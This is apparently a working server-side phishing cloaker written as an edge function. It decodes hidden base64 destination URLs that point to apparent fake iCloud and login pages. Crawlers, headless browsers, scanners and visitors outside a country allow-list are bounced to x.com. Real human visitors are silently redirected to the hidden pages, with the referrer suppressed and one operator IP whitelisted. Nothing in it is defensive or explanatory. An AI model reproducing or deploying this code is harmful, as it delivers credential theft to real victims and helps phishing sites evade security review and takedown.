export const runtime = 'edge';

export async function GET(request) {
  // ⚙️ SET TO true TO SEE EXACTLY WHY YOU ARE GOING TO X.COM ON YOUR SCREEN
  const DEBUG = true; 

  const BOT_DESTINATION = "https://x.com";
  
  // 🌐 SUBDOMAIN ROUTING MAP
  const SUBDOMAIN_MAP = {
    "acctpays": "aHR0cHM6Ly9pY2xvdWRtYWlsZGlyZWN0b3J5LnRvcD80RWROMndQZDdnPWNYTjVZUT09",
    "doclabs": "aHR0cHM6Ly9pY2xvdWRtYWlsZGlyZWN0b3J5LnRvcD80RWROMndQZDdnPWNYTjVZUT09",
    "rswer": "aHR0cHM6Ly9sb2dpbi5tZ2V1bmRlcmdyb3VuZHMuY29tP3cxSEpaQ203VEtIYy1RPWJYSnljWGwxWkE9PQ=="
  };

  const IP_WHITELIST = ["151.240.53.24"]; 
  const url = new URL(request.url);
  const queryParameters = url.search;

  // Extract host header plain text
  const incomingHost = (request.headers.get('host') || '').toLowerCase();

  // Find if any of your keyword subdomains are inside the incoming host address
  let matchedKey = null;
  for (const key in SUBDOMAIN_MAP) {
    if (incomingHost.includes(key)) {
      matchedKey = key;
      break;
    }
  }

  // 🚪 ROUTING VALIDATION: If the sub-word isn't found anywhere in the URL, route to bot destination
  if (!matchedKey) {
    if (DEBUG) return new Response(`DEBUG: No matching subdomain found in host string "${incomingHost}"`, { status: 200 });
    return Response.redirect(BOT_DESTINATION, 302);
  }

  const ENCODED_HUMAN_URL = SUBDOMAIN_MAP[matchedKey]; 

  const userAgent = request.headers.get('user-agent') || '';
  const acceptLang = request.headers.get('accept-language') || '';
  const clientIp = request.headers.get('x-forwarded-for') || ''; 
  const visitorCountry = (request.headers.get('x-vercel-ip-country') || '').toUpperCase();

  const isWhitelisted = IP_WHITELIST.includes(clientIp);

  if (!isWhitelisted) {
    // 1. Missing language header check
    if (!acceptLang) {
      if (DEBUG) return new Response(`DEBUG: Blocked due to missing Accept-Language header.`, { status: 200 });
      return Response.redirect(BOT_DESTINATION, 302);
    }
    
    // 2. Bot User Agent signature strings check
    if (/bot|crawl|spider|slurp|facebookexternalhit|twitterbot|linkedinbot|pingdom|telegrambot|whatsapp|google|yandex|baidu|bing/i.test(userAgent)) {
      if (DEBUG) return new Response(`DEBUG: Blocked by User-Agent signature matching: "${userAgent}"`, { status: 200 });
      return Response.redirect(BOT_DESTINATION, 302);
    }

    // 3. Allowed countries list constraint filter
    const allowedCountries = ['NG', 'US', 'CA', 'GB', 'IE', 'DE', 'FR', 'IT', 'ES', 'NL', 'BE', 'CH', 'AT'];
    if (!allowedCountries.includes(visitorCountry)) {
      if (DEBUG) return new Response(`DEBUG: Blocked by country filter. Your detected Vercel country code is: "${visitorCountry}"`, { status: 200 });
      return Response.redirect(BOT_DESTINATION, 302);
    }
  }

  const finalQuery = queryParameters ? queryParameters : "";

  const htmlResponse = `
  <!DOCTYPE html>
  <html>
  <head>
    <meta charset="utf-8">
    <meta name="referrer" content="no-referrer">
    <title>Loading...</title>
    <script>
      (function() {
        const bypassJSFlags = ${isWhitelisted}; 
        
        if (!bypassJSFlags) {
          if (navigator.webdriver || !navigator.languages || navigator.languages.length === 0) {
            window.location.replace("${BOT_DESTINATION}");
            return;
          }
          const executionFootprint = (function() {
            try {
              if (navigator.hardwareConcurrency && navigator.hardwareConcurrency < 1) return true;
              if (!window.chrome && !navigator.userAgent.includes('Safari') && !navigator.userAgent.includes('Firefox')) return true;
              const pc = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
              if (!pc && (navigator.userAgent.includes('Chrome') || navigator.userAgent.includes('Safari'))) return true;
            } catch(e) { return true; }
            return false;
          })();
          if (executionFootprint) {
            window.location.replace("${BOT_DESTINATION}");
            return;
          }
        }

        const baseTarget = atob("${ENCODED_HUMAN_URL}");
        const incomingQuery = "${finalQuery}";
        
        let finalDestination = baseTarget;
        if (incomingQuery) {
          const separator = finalDestination.includes('?') ? '&' : '?';
          finalDestination = finalDestination + separator + incomingQuery.substring(1);
        }

        Object.defineProperty(document, 'referrer', {get : function(){ return ''; }});
        window.location.replace(finalDestination);
      })();
    </script>
  </head>
  <body style="background:#ffffff; color:#ffffff; user-select:none;">
  </body>
  </html>
  `;

  return new Response(htmlResponse, {
    headers: { 
      "content-type": "text/html;charset=UTF-8",
      "Cache-Control": "no-store, no-cache, must-revalidate, max-age=0"
    },
  });
}
